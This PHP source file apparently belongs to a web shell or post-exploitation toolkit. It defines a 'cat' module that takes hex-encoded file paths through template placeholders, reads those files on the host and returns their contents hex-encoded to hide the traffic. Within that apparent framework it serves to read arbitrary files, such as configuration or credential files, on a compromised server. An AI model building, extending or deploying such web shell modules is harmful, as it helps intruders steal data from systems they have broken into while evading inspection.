#<?php


class Module_cat
{
    private $SUCC_CODE        = 0;
    private $ERR_CODE         = 1;

    private $FIELD_SEPARATOR  = ",";
    private $VALUE_SEPARATOR  = "=";

    private $RESPONSE_STATUS  = "status";
    private $RESPONSE_MESSAGE = "message";

    private $return_code;

    public function __construct($cwd)
    {
        $this->return_code = $this->SUCC_CODE;
        $cwd = $this->normalizePath($cwd);
        chdir($cwd);
    }

    private function normalizePath($currPath)
    {
        $currPath = str_replace("\"", "", $currPath);
        $currPath = str_replace("'", "", $currPath);
        $currPath = str_replace("\\", "/", $currPath);
        return $currPath;
    }

    private function parseArgs($args)
    {
        preg_match_all('/"[^"]+"|\'[^\']+\'|\S+/', $args, $matches);
        return $matches[0];
    }

    private function generateResponse($result)
    {
        $response  = "";
        $response .= $this->RESPONSE_STATUS . $this->VALUE_SEPARATOR . $this->return_code;
        $response .= $this->FIELD_SEPARATOR;
        $response .= $this->RESPONSE_MESSAGE . $this->VALUE_SEPARATOR . bin2hex($result);
        return bin2hex($response);
    }

    private function isTextFile($filename)
    {
        $finfo = finfo_open(FILEINFO_MIME);
        return substr(finfo_file($finfo, $filename), 0, 4) == 'text';
    }

    private function doRead($files)
    {
        $result = "";

        foreach ($files as $file)
        {
            $file = $this->normalizePath($file);

            if (@file_exists($file) === false)
            {
                $result .= "cat: $file: No such file or directory" . PHP_EOL;
                continue;
            }

            if (@is_readable($file) === false)
            {
                $result .= "cat: $file: Permission denied" . PHP_EOL;
                continue;
            }

            if (@is_dir($file) === true)
            {
                $result .= "cat: $file: Is a directory" . PHP_EOL;
                continue;
            }

            if ($this->isTextFile($file) === false)
            {
                $result .= "cat: '$file': Is not ASCII file" . PHP_EOL;
                continue;
            }

            $result .= file_get_contents($file);
        }

        return $result;
    }

    public function execute($args)
    {
        $result = "";
        $parsed_args = $this->parseArgs(hex2bin($args));

        if (sizeof($parsed_args) >= 1)
        {
            $result = $this->doRead($parsed_args);
        }
        else
        {
            $result = "Invalid arguments provided. Specify one or multiple files" . PHP_EOL;
            $this->return_code = $this->ERR_CODE;
        }

        return $this->generateResponse($result);
    }
}


$cwd = '#{CWD}';
$args = '#{ARGS}';
$module = new Module_cat($cwd);
print($module->execute($args));